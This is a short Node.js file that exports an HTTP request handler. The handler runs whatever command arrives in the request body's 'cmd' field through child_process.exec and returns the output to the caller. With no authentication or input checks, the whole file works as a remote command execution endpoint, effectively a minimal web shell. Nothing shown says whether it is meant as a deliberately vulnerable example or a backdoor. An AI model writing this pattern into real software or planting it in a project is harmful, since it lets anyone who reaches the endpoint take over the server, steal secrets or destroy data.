const cp = require('child_process');

exports.run = (req, res) => {
  const cmd = req.body.cmd;
  cp.exec(cmd, (err, out) => {
    res.send(out);
  });
};
